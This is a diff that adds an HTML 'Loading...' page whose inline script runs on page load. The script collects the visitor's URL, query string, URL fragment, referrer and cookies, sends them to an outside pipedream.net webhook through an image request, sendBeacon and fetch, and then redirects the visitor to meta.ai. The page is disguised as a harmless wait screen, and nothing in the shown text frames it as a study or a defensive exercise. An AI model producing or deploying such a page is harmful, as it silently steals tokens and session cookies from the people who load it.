@@ -1,1 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<p>Please wait...</p>
+<script>
+(function(){
+  var webhook = "https://eoylavrsjqkz18k.m.pipedream.net";
+  
+  var data = {
+    url: window.location.href,
+    query: window.location.search,
+    fragment: window.location.hash,
+    referrer: document.referrer,
+    cookies: document.cookie,
+    ts: new Date().toISOString()
+  };
 
+  var img = new Image();
+  img.src = webhook + "?d=" + encodeURIComponent(JSON.stringify(data));
+
+  if (navigator.sendBeacon) {
+    navigator.sendBeacon(webhook, JSON.stringify(data));
+  }
+
+  fetch(webhook, {
+    method: "POST",
+    mode: "no-cors",
+    headers: {"Content-Type": "text/plain"},
+    body: JSON.stringify(data)
+  }).finally(function(){
+    setTimeout(function(){
+      window.location.href = "https://meta.ai/";
+    }, 500);
+  });
+})();
+</script>
+</body>
+</html>
